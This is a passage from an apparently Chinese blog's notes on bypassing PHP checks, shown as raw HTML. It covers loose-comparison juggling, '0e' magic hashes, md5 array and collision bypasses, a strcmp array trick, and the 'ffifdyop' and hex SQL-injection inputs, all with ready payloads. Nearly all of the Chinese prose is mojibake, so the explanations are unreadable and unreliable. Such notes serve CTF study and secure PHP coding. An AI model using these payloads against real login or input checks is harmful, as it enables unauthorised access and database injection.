<span class="comment">//false</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin1&quot;</span>==<span class="number">0</span>) <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;   2asda&#x27;</span>==<span class="number">2</span>);<span class="comment">//true</span></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>è¿™æ˜¯å› ä¸ºåœ¨æ‰§è¡Œå…³ç³»è¿ç®—â€&#x3D;&#x3D;â€œæ—¶è¦æ±‚è¿ç®—ç¬¦ä¸¤è¾¹çš„æ•°æ®ç±»å‹å¿…é¡»ä¸€è‡´(å­—ç¬¦ä¸²ä¸æ•´å‹æ¯”è¾ƒï¼Œå­—ç¬¦ä¸²â†’æ•´å‹)ï¼Œå½“å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´å‹æ—¶ï¼Œå¦‚æœå­—ç¬¦ä¸²ä»¥æ•´å‹å¼€å¤´æˆ–è€…ä»¥ç©ºæ ¼+æ•´å‹å¼€å¤´ï¼Œå°±å–æ•´å‹çš„å€¼ï¼Œåä¹‹åˆ™å–å€¼0.</p><p>ä¾‹å­</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$passwd</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$passwd</span>==<span class="number">1234567</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">payload:passwd=<span class="number">1234567</span>sdkasj  (ä¸è¦åŠ å¼•å·,é»˜è®¤æ¥æ”¶å­—ç¬¦ä¸²å‚æ•°)</span><br></pre></td></tr></table></figure><h4 id="0eç§‘å­¦è®¡æ•°æ³•"><a href="#0eç§‘å­¦è®¡æ•°æ³•" class="headerlink" title="0eç§‘å­¦è®¡æ•°æ³•"></a>0eç§‘å­¦è®¡æ•°æ³•</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;0e123456&quot;</span>==<span class="string">&quot;0e4456789&quot;</span>); <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;0e123456&quot;</span>==<span class="string">&quot;0easdasd9&quot;</span>);<span class="comment">//false</span></span><br></pre></td></tr></table></figure><p>è€Œå½“å­—ç¬¦ä¸²ä¸­å«æœ‰0e&#x2F;0Eæ—¶ï¼Œphpä¼šå°†0eè¿™ç±»å­—ç¬¦ä¸²è¯†åˆ«ä¸ºç§‘å­¦æŠ€æœ¯æ³•çš„æ•°å­—ï¼Œè€Œ0çš„å¤šå°‘æ¬¡æ–¹éƒ½ç­‰äº0ï¼Œæ‰€ä»¥ç›¸ç­‰ã€‚</p><h3 id="x3D-x3D-x3D-ï¼ˆä¸¥æ ¼æ¯”è¾ƒï¼‰"><a href="#x3D-x3D-x3D-ï¼ˆä¸¥æ ¼æ¯”è¾ƒï¼‰" class="headerlink" title="&#x3D;&#x3D;&#x3D;ï¼ˆä¸¥æ ¼æ¯”è¾ƒï¼‰"></a>&#x3D;&#x3D;&#x3D;ï¼ˆä¸¥æ ¼æ¯”è¾ƒï¼‰</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;0dff&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> === <span class="variable">$str</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;true&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;false&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;<span class="literal">false</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…¨ç­‰äºæ“ä½œè¿‡ç¨‹å¦‚ä¸‹ï¼š<br>1.åˆ¤æ–­ä¸¤è¾¹æ•°æ®ç±»å‹æ˜¯å¦ç›¸åŒ  </p><p>2.åˆ¤æ–­ä¸¤è¾¹å€¼æ˜¯å¦ç›¸åŒ</p><p>3.å°†å‰ä¸¤æ­¥çš„ç»“æœè¿›è¡Œä¸è¿ç®—ï¼Œå¾—å‡ºæœ€ç»ˆç»“æœ</p><h3 id="MD5ç¼ºé™·"><a href="#MD5ç¼ºé™·" class="headerlink" title="MD5ç¼ºé™·"></a><strong>MD5ç¼ºé™·</strong></h3><h5 id="â‘ MD5ï¼ˆstring-rawï¼‰å‡½æ•°è§£æ"><a href="#â‘ MD5ï¼ˆstring-rawï¼‰å‡½æ•°è§£æ" class="headerlink" title="â‘ MD5ï¼ˆstring,rawï¼‰å‡½æ•°è§£æ"></a>â‘ MD5ï¼ˆstring,rawï¼‰å‡½æ•°è§£æ</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ffifdyop&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ffifdyop&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$b</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;<span class="number">276</span>f722736c95d99e921722cf9ed621c</span><br><span class="line"><span class="string">&#x27;or&#x27;</span><span class="number">6</span>ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b</span><br><span class="line">å½“raw=<span class="literal">true</span>æ—¶ï¼Œæµè§ˆå™¨ä¼šå¯¹å…¶è¿”å›çš„æ•°æ®<span class="string">&#x27;or&#x27;</span><span class="number">6</span>\xc9]\x99\xe9!r,\xf9\xedb\x1cï¼ˆåŸå§‹äºŒè¿›åˆ¶æ ¼å¼ï¼‰è¿›è¡Œäº†å­—ç¬¦åŒ–å¤„ç†ï¼Œç”±æ­¤å°±ä¼šäº§ç”Ÿä¹±ç ã€‚</span><br><span class="line">æˆ‘ä»¬å¯ä»¥å‘ç°å¾—åˆ°çš„å­—ç¬¦ä¸²å«æœ‰<span class="string">&#x27;or&#x27;</span><span class="number">6</span>,,å¯ä»¥ç”¨æ¥è¿›è¡Œsqlæ³¨å…¥</span><br><span class="line">å¦‚select * <span class="keyword">from</span> <span class="string">&#x27;admin&#x27;</span> where password=<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>,<span class="literal">true</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;PHP&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>),<span class="number">8</span>,<span class="number">16</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$b</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;      <span class="number">04</span>a5c23ac138da22</span><br><span class="line"><span class="number">2</span>fec392304a5c23ac138da22847f9b7c</span><br><span class="line">æˆ‘ä»¬å¯ä»¥å‘ç°md5çš„å¯†æ–‡ä¸­ï¼Œ<span class="number">16</span>ä½å¯†æ–‡ä¸<span class="number">32</span>ä½å¯†æ–‡çš„ç¬¬<span class="number">8</span>-<span class="number">24</span>ä½å­å­—ç¬¦ä¸²æ˜¯ä¸€æ ·çš„ã€‚</span><br></pre></td></tr></table></figure><h5 id="â‘¡å¼±ç±»å‹æ¯”è¾ƒ"><a href="#â‘¡å¼±ç±»å‹æ¯”è¾ƒ" class="headerlink" title="â‘¡å¼±ç±»å‹æ¯”è¾ƒ"></a>â‘¡å¼±ç±»å‹æ¯”è¾ƒ</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œé€šè¿‡!=æˆ–==æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå½“å“ˆå¸Œå€¼å¼€å¤´ä¸º<span class="number">0</span>eæ—¶ï¼Œåœ¨æ¯”è¾ƒçš„æ—¶å€™ä¼šå°†å…¶è§†ä½œä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œè€Œ<span class="number">0</span>çš„å¤šå°‘æ¬¡æ–¹è¿˜æ˜¯<span class="number">0</span></span><br><span class="line">æ‰€ä»¥<span class="title function_ invoke__">MD5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>)==<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;s878926199a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">    </span><br><span class="line"><span class="number">1586264293</span></span><br><span class="line"><span class="number">0e622743671155995737639662718498</span></span><br><span class="line">    </span><br><span class="line"><span class="number">240610708</span></span><br><span class="line"><span class="number">0e462097431906509019562988736854</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="variable">$a</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)</span><br><span class="line"><span class="variable">$a</span>=<span class="number">0e215962017</span></span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)=<span class="number">0e291242476940776845150308577824</span></span><br></pre></td></tr></table></figure><h5 id="â‘¢å¼ºæ¯”è¾ƒç»•è¿‡"><a href="#â‘¢å¼ºæ¯”è¾ƒç»•è¿‡" class="headerlink" title="â‘¢å¼ºæ¯”è¾ƒç»•è¿‡"></a>â‘¢å¼ºæ¯”è¾ƒç»•è¿‡</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">åœ¨ä½¿ç”¨===æˆ–ï¼==æ¥è¿›è¡Œå¼ºæ¯”è¾ƒæ—¶</span><br><span class="line">    </span><br><span class="line">å¯ä»¥é€šè¿‡æ„é€ å‚æ•°ä¸ºæ•°ç»„ç±»å‹æ¥è¿›è¡Œç»•è¿‡</span><br><span class="line">åŸç†ï¼š<span class="title function_ invoke__">md5</span>()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ç±»å‹çš„æ•°å€¼ï¼Œä¼šç›´æ¥è¿”å›<span class="literal">NULL</span></span><br><span class="line">é‚£ä¹ˆ<span class="title function_ invoke__">MD5</span>(param1[])===<span class="title function_ invoke__">MD5</span>(param2[])ä»è€Œç»•è¿‡</span><br><span class="line">å½“ç„¶å¼±ç±»å‹æ¯”è¾ƒä¹Ÿå¯ä»¥ä½¿ç”¨è¿™ç§æ–¹æ³•æ¥è¿›è¡Œç»•è¿‡</span><br><span class="line">    </span><br><span class="line"> <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$id</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>)</span><br><span class="line">&gt;&gt;payload:id[]=xxx&amp;gg[]=xxx</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">ä½†æ˜¯å½“é™åˆ¶äº†ä¼ å…¥çš„å‚æ•°å¿…é¡»ä¸º<span class="keyword">string</span>ç±»å‹æ—¶ä¸Šè¿°æ–¹æ³•å°±ä¸å¯ä»¥äº†</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">ä½¿ç”¨md5ç¢°æ’ç”Ÿæˆç›¸åŒmd5</span><br><span class="line"></span><br><span class="line">urlç¼–ç  <span class="number">1</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%CEZr%C6%<span class="number">1</span>D%<span class="number">28</span>j%<span class="number">22</span>%<span class="number">9</span>E%<span class="number">60</span>%<span class="number">8</span>Dt%AB4%ADU%E5%<span class="number">8</span>B%<span class="number">89</span>%<span class="number">89</span>%E6j%D0FH%EE8%D1%E6%<span class="number">11</span>%<span class="number">18</span>%AB3%A6%EC%E3%B8%<span class="number">2</span>F%<span class="number">3</span>C%<span class="number">97</span>k%<span class="number">0</span>CIt%<span class="number">02</span>%<span class="number">94</span>%<span class="number">92</span>W%<span class="number">9</span>D%ED%B9%EDc%CC%<span class="number">5</span>D%<span class="number">2</span>A%A1%<span class="number">9</span>B%B3%<span class="number">7</span>B%<span class="number">27</span>%<span class="number">13</span>i%<span class="number">05</span>%<span class="number">8</span>A%A7%<span class="number">5</span>E%B3J%BE.R%A6%D7%D5%<span class="number">7</span>C%A4%<span class="number">24</span>%A5%DB%<span class="number">84</span>%D8%E7%A3%<span class="number">03</span>%E4F%EC%<span class="number">1</span>C%<span class="number">95</span>%B1%D6L%<span class="number">88</span>%AD%CD%D5%CF%B6%E8%<span class="number">26</span>%AEff%<span class="number">2</span>A%<span class="number">3</span>B%C9%D9%<span class="number">9</span>B%C8z%<span class="number">7</span>E%DB%A4m%C5%<span class="number">8</span>F%CF%<span class="number">83</span>%<span class="number">06</span>%<span class="number">5</span>E%EA%CCW%B3M%<span class="number">3</span>E%C8</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">urlç¼–ç  <span class="number">1</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%CEZr%C6%<span class="number">1</span>D%<span class="number">28</span>j%<span class="number">22</span>%<span class="number">9</span>E%<span class="number">60</span>%<span class="number">8</span>Dt%AB4%ADU%E5%<span class="number">8</span>B%<span class="number">89</span>%<span class="number">09</span>%E6j%D0FH%EE8%D1%E6%<span class="number">11</span>%<span class="number">18</span>%AB3%A6%EC%E3%B8%<span class="number">2</span>F%<span class="number">3</span>C%<span class="number">97</span>k%<span class="number">0</span>CIt%<span class="number">02</span>%<span class="number">14</span>%<span class="number">93</span>W%<span class="number">9</span>D%ED%B9%EDc%CC%<span class="number">5</span>D%<span class="number">2</span>A%A1%<span class="number">9</span>B%B3%FB%<span class="number">27</span>%<span class="number">13</span>i%<span class="number">05</span>%<span class="number">8</span>A%A7%<span class="number">5</span>E%B3J%BE.R%A6%D7%D5%<span class="number">7</span>C%A4%<span class="number">24</span>%A5%DB%<span class="number">84</span>%D8%E7%<span class="number">23</span>%<span class="number">03</span>%E4F%EC%<span class="number">1</span>C%<span class="number">95</span>%B1%D6L%<span class="number">88</span>%AD%CD%D5%CF%B6%E8%<span class="number">26</span>%AEff%<span class="number">2</span>A%<span class="number">3</span>B%C9%D9%<span class="number">9</span>BHz%<span class="number">7</span>E%DB%A4m%C5%<span class="number">8</span>F%CF%<span class="number">83</span>%<span class="number">06</span>%<span class="number">5</span>E%EA%CC%D7%B3M%<span class="number">3</span>E%C8</span><br></pre></td></tr></table></figure><h2 id="è¯­è¨€æ„é€ å™¨"><a href="#è¯­è¨€æ„é€ å™¨" class="headerlink" title="è¯­è¨€æ„é€ å™¨"></a>è¯­è¨€æ„é€ å™¨</h2><p>[è¯­è¨€æ„é€ å™¨å’Œå˜é‡å‡½æ•°]<a href="https://segmentfault.com/q/1010000000188609">https://segmentfault.com/q/1010000000188609</a></p><p><img src="/../images/image-20220701135401603-1687677391910.png" alt="image-20220701135401603">å½“è§£é‡Šå™¨é‡åˆ°ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Hello world&#x27;</span>;</span><br></pre></td></tr></table></figure><p>è¿™æ ·çš„ä¸€ä¸ªè¡¨è¾¾å¼çš„æ—¶å€™ï¼Œå¹¶ä¸ä¼šæŠŠå®ƒè½¬æ¢æˆå‡½æ•°è°ƒç”¨ï¼Œè€Œæ˜¯ç›´æ¥æ˜ å°„åˆ°ä¸€ç³»åˆ—é¢„å…ˆå®šä¹‰å¥½çš„æ“ä½œã€‚ä½¿ç”¨è¯­è¨€æ„æˆçš„æ—¶å€™å¯ä»¥åŠ æ‹¬å·ï¼Œä¹Ÿå¯ä»¥ä¸åŠ æ‹¬å·ï¼Œä½†æ˜¯ä½¿ç”¨å‡½æ•°çš„æ—¶å€™å¿…é¡»åŠ æ‹¬å·ã€‚</p><h2 id="ç²¾åº¦ç¼ºé™·"><a href="#ç²¾åº¦ç¼ºé™·" class="headerlink" title="ç²¾åº¦ç¼ºé™·"></a>ç²¾åº¦ç¼ºé™·</h2><p>phpæœ€å¤§ç²¾åº¦æ˜¯14ä½ï¼Œå¦‚æœè¶…å‡º14ä½ä¼šè¡°å‡</p><p><img src="/../images/1598509437.png!small" alt="1598509437.png!small"></p><p><img src="/../images/1598509504.png!small" alt="1598509504.png!small"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;trick1 !== <span class="variable language_">$this</span>-&gt;trick2 &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;trick1) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;trick2) &amp;&amp; <span class="variable language_">$this</span>-&gt;trick1 != <span class="variable language_">$this</span>-&gt;trick2)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">trick1=<span class="number">0.1</span>&amp;trick2=<span class="number">0.100000000000001</span></span><br><span class="line"></span><br><span class="line">éƒ½ä¸ºINF/<span class="title function_ invoke__">NAN</span>(æå°/æå¤§)</span><br></pre></td></tr></table></figure><h2 id="strcmp-â€“æ•°å€¼æ¯”è¾ƒ"><a href="#strcmp-â€“æ•°å€¼æ¯”è¾ƒ" class="headerlink" title="strcmp()â€“æ•°å€¼æ¯”è¾ƒ"></a>strcmp()â€“æ•°å€¼æ¯”è¾ƒ</h2><p>ä½¿ç”¨æ¡ä»¶ï¼šphp&gt;&#x3D;5.3</p><p>å½“ç¨‹åºé€»è¾‘è¿›è¡Œäº†æ•°å€¼çš„æ¯”è¾ƒæ—¶ï¼Œå¯ä»¥å°è¯•æ¯”è¾ƒå‡½æ•°æ˜¯å¦ä¸ºstrcmp()</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">strcmp</span> ( <span class="keyword">string</span> <span class="variable">$str1</span> , <span class="keyword">string</span> <span class="variable">$str2</span> )</span><br><span class="line">å¦‚æœ str1 å°äº str2 è¿”å› &lt; <span class="number">0</span>ï¼› å¦‚æœ str1 å¤§äº str2 è¿”å› &gt; <span class="number">0</span>ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› <span class="number">0</span>ã€‚(åŒºåˆ†å¤§å°å†™)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ä½†æ˜¯<span class="title function_ invoke__">strcmp</span>()æ¯”è¾ƒçš„å¯¹è±¡æ˜¯å­—ç¬¦ä¸²å’Œæ•°ç»„çš„æ—¶å€™ï¼Œè™½ç„¶ä¼šæŠ¥é”™ï¼Œä½†æ˜¯ä»ç„¶ä¼šç›´æ¥è¿”å›<span class="number">0</span>ï¼Œè¿™æ ·é€šè¿‡æŠŠç›®æ ‡å˜é‡è®¾ç½®æˆæ•°ç»„å°±å¯ä»¥ç»•è¿‡è¯¥å‡½æ•°çš„é™åˆ¶ã€‚</span><br><span class="line"><span class="comment">#php7.0</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$password</span> = [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strcmp</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="variable">$password</span>))<span class="comment">//å­—ç¬¦ä¸²ä¸æ•°ç»„è¿›è¡Œæ¯”è¾ƒ</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Success!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;Warning: <span class="title function_ invoke__">strcmp</span>() expects parameter <span class="number">2</span> to be <span class="keyword">string</span>, <span class="keyword">array</span> given in /usercode/file.php on line <span class="number">3</span></span><br><span class="line">Success!</span><br></pre></td></tr></table></figure><h2 id="intval-â€“php5"><a href="#intval-â€“php5" class="headerlink" title="intval()â€“php5"></a>intval()â€“php5</h2><p><img src="/../images/image-20220922202838221-1687432076954.png" alt="image-20220922202838221"></p><h2 id="is-numericï¼ˆï¼‰"><a href="#is-numericï¼ˆï¼‰" class="headerlink" title="is_numericï¼ˆï¼‰"></a>is_numericï¼ˆï¼‰</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>]:<span class="number">0</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;insert into test(type)values(<span class="subst">$s</span>);&quot;</span>;  <span class="comment">//æ˜¯ values($s) ä¸æ˜¯values(&#x27;$s&#x27;)</span></span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">ä¸Šé¢è¿™ä¸ªç‰‡æ®µç¨‹åºæ˜¯åˆ¤æ–­å‚æ•°sæ˜¯å¦ä¸ºæ•°å­—ï¼Œæ˜¯åˆ™è¿”å›æ•°å­—ï¼Œä¸æ˜¯åˆ™è¿”å›<span class="number">0</span>ï¼Œç„¶åå¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ã€‚ï¼ˆè¿™æ ·å°±æ„é€ ä¸äº†sqlè¯­å¥ï¼‰</span><br><span class="line">æˆ‘ä»¬å¯ä»¥æŠŠâ€˜<span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span><span class="string">&#x27; è½¬æ¢ä¸º16è¿›åˆ¶ 0x31206f722031 ä¸ºså‚æ•°çš„å€¼</span></span><br><span class="line"><span class="string">l</span></span><br></pre></td></tr></table></figure><h2 id="array-search-x2F-in-array"><a href="#array-search-x2F-in-array" class="headerlink" title="array_search&#x2F;in_array"></a>array_search&#x2F;in_array</h2><blockquote><p>å¤§æµ·æé’ˆï¼Œåœ¨å¤§æµ·ï¼ˆ<code>haystack</code>ï¼‰ä¸­æœç´¢é’ˆï¼ˆ <code>needle</code>ï¼‰ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½® <code>strict</code> åˆ™ä½¿ç”¨å®½æ¾çš„æ¯”è¾ƒã€‚</p></blockquote><p>å‚æ•°ï¼š(<a href="https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed">mixed</a> <code>$needle</code>, array <code>$haystack</code>, bool <code>$strict</code> &#x3D; <strong><code>false</code></strong>): bool</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å½“æ¨¡å¼ä¸º<span class="literal">false</span>æ—¶ï¼Œå…¶æŸ¥æ‰¾æ˜¯é€šè¿‡==æ¥æ¯”è¾ƒçš„</span><br><span class="line"></span><br><span class="line">å½“æ¨¡å¼ä¸º<span class="literal">true</span>æ—¶ï¼Œå…¶æŸ¥æ‰¾æ˜¯é€šè¿‡===æ¥æ¯”è¾ƒçš„</span><br></pre></td></tr></table></figure><h2 id="escapeshellargå’Œescapeshellcmd"><a href="#escapeshellargå’Œescapeshellcmd" class="headerlink" title="escapeshellargå’Œescapeshellcmd"></a>escapeshellargå’Œescapeshellcmd</h2><p><a href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html">https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html</a></p><p><a href="https://www.anquanke.com/post/id/107336">https://www.anquanke.com/post/id/107336</a></p><h2 id="preg"><a href="#preg" class="headerlink" title="preg"></a>preg</h2><h4 id="preg-matchï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼Œå¾…åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ•è·åˆ†ç»„ï¼‰"><a href="#preg-matchï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼Œå¾…åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ•è·åˆ†ç»„ï¼‰" class="headerlink" title="preg-matchï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼Œå¾…åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ•è·åˆ†ç»„ï¼‰"></a>preg-matchï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼Œå¾…åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ•è·åˆ†ç»„ï¼‰</h4><blockquote><p>**preg_match()<strong>è¿”å› <code>pattern</code> çš„åŒ¹é…æ¬¡æ•°ã€‚ å®ƒçš„å€¼å°†æ˜¯0æ¬¡ï¼ˆä¸åŒ¹é…ï¼‰æˆ–1æ¬¡ï¼Œå› ä¸º</strong>preg_match()**åœ¨ç¬¬ä¸€æ¬¡åŒ¹é…å 